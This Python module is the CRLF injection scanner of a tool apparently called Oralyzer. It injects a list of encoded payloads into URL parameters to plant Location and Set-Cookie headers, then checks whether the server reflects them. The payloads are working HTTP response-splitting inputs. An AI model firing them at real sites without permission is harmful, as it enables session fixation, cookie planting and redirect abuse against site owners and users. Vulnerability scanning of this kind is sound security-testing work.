"""CRLF injection scan for Oralyzer."""

import requests

from core.others import good, bad, info, requester, multitest, results

redirectCodes = range(300, 311)
errorCodes = range(400, 411)

payloads = [
    r"%0d%0aLocation:www.google.com%0d%0a",
    r"%0d%0aSet-Cookie:name=ch33ms;",
    r"\r\n\tSet-Cookie:name=ch33ms;",
    r"\r\tSet-Cookie:name=ch33ms;",
    r"%E5%98%8A%E5%98%8DLocation:www.google.com",
    r"\rSet-Cookie:name=ch33ms;",
    r"\r%20Set-Cookie:name=ch33ms;",
    r"\r\nSet-Cookie:name=ch33ms;",
    r"\r\n%20Set-Cookie:name=ch33ms;",
    r"%u000ASet-Cookie:name=ch33ms;",
    r"%23%0D%0ALocation:www.google.com;",
    r"%5cr%5cnLocation:www.google.com",
    r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;"
]


def crlfScan(url: str, proxy: bool) -> None:
    """Scan a URL for CRLF injection using the built-in payloads."""
    paramUrl = multitest(url, payloads)
    if isinstance(paramUrl, tuple):
        queries, sent, base = paramUrl
        for params, payload in zip(queries, sent):
            if request(base, proxy, params, payload):
                break
    else:
        urls, sent = paramUrl
        for url, payload in zip(urls, sent):
            if request(url, proxy, '', payload):
                break


def request(uri: str, proxy: bool, params: str = "", payload: str = "") -> bool | None:
    """Request a single injected URL and check the response for CRLF."""
    try:
        response = requester(uri, proxy, params)
    except requests.exceptions.Timeout:
        print("[\033[91mTimeout\033[00m] %s" % uri)
        return True
    except requests.exceptions.ConnectionError:
        print("%s Connection Error" % bad)
        return True

    basicChecks(response, response.request.url, payload)


def basicChecks(response: requests.Response, url: str, payload: str = "") -> None:
    """Detect CRLF in the response headers/cookies."""
    googles = ["https://www.google.com", "http://www.google.com", "google.com", "www.google.com"]

    if response.headers.get('Location') in googles or response.headers.get('Set-Cookie') == "name=ch33ms;":
        print("%s HTTP Response Splitting found" % good)
        print("%s Payload : %s" % (info, payload))
        results.append({"type": "crlf", "payload": payload, "status_code": response.status_code, "request_url": url, "destination": response.headers.get('Location')})

    elif response.status_code in errorCodes:
        print("%s %s [\033[91m%s\033[00m]" % (bad, url, response.status_code))

    else:
        print("%s Found nothing :: %s" % (bad, url))
